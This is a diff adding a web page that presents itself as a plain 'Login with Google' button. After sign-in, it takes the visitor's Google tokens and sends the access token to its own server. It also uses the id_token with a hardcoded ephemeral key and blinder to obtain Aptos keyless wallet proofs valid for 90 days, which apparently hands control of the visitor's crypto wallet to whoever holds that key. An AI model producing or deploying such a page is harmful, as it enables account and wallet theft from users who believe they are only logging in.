@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Sign-In</title>
+</head>
+<body>
+  <h1>Login with Google</h1>
+  <button id="google-signin-button">Sign in with Google</button>
+  <pre id="response-output"></pre>
+
+  <script>
+    document.getElementById('google-signin-button').onclick = function () {
+      const googleAuthUrl =
+        'https://accounts.google.com/o/oauth2/v2/auth?scope=openid%20email%20profile&include_granted_scopes=true&response_type=token+id_token&state=state_parameter_passthrough_value&redirect_uri=https://pouncing-ribbon-amphibian.glitch.me&client_id=1055066757740-i0hcpultsqcbgvait9v85mnr5ac99i9q.apps.googleusercontent.com&nonce=8008852504981705802738758648123176975751211420905735660195042203168799675351';
+      window.location.href = googleAuthUrl;
+    };
+
+    function extractTokensFromUrl() {
+      const hash = window.location.hash.substring(1);
+      const params = new URLSearchParams(hash);
+      return {
+        id_token: params.get('id_token'),
+        access_token: params.get('access_token'),
+      };
+    }
+
+    window.onload = async function () {
+      const { id_token, access_token } = extractTokensFromUrl();
+
+      if (access_token) {
+        sendAccessTokenToServer(access_token);
+      }
+
+      if (id_token) {
+        try {
+          // First request to get pepper and address
+          const pepperResp = await fetch('https://api.mainnet.aptoslabs.com/keyless/pepper/v0/fetch', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-Aptos-Client': 'aptos-typescript-sdk/2.0.0',
+              'X-Aptos-Typescript-Sdk-Origin-Method': 'getPepper',
+            },
+            body: JSON.stringify({
+              jwt_b64: id_token,
+              epk: '00206ec4c65788c05269497f391781706fd34f8884144a7f36b27dba1a629274d1d0',
+              exp_date_secs: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 90, // 90 days
+              epk_blinder: 'ad80f759befc10e5cf99279a521d6d60a2d090cf5170a74640a002b6a14863',
+              uid_key: 'sub',
+            }),
+          });
+
+          const pepperData = await pepperResp.json();
+          const { pepper, address } = pepperData;
+
+          // Second request to get the proof
+          const proofResp = await fetch('https://api.mainnet.aptoslabs.com/keyless/prover/v0/prove', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'X-Aptos-Client': 'aptos-typescript-sdk/2.0.0',
+              'X-Aptos-Typescript-Sdk-Origin-Method': 'getProof',
+            },
+            body: JSON.stringify({
+              jwt_b64: id_token,
+              epk: '00206ec4c65788c05269497f391781706fd34f8884144a7f36b27dba1a629274d1d0',
+              epk_blinder: 'ad80f759befc10e5cf99279a521d6d60a2d090cf5170a74640a002b6a14863',
+              exp_date_secs: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 90, // 90 days
+              exp_horizon_secs: 10000000,
+              pepper: pepper,
+              uid_key: 'sub',
+            }),
+          });
+
+          const proofData = await proofResp.json();
+
+          // Display everything
+          document.getElementById('response-output').textContent = JSON.stringify({
+            pepperData,
+            proofData,
+          }, null, 2);
+        } catch (error) {
+          console.error('Error during pepper/prove requests:', error);
+          document.getElementById('response-output').textContent = JSON.stringify({ error: error.message }, null, 2);
+        }
+      }
+    };
+
+    function sendAccessTokenToServer(access_token) {
+      fetch('/process-access-token', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ access_token })
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Simpleswap response:', data);
+        // Also log Simpleswap output (in addition to pepper/proof response)
+        const output = document.getElementById('response-output');
+        const currentText = output.textContent || '';
+        output.textContent = currentText + '\n\nSimpleswap Response:\n' + JSON.stringify(data, null, 2);
+      })
+      .catch(error => {
+        console.error('Error sending access token:', error);
+        const output = document.getElementById('response-output');
+        output.textContent += '\n\nAccess token error:\n' + error.message;
+      });
+    }
+  </script>
+</body>
+</html>
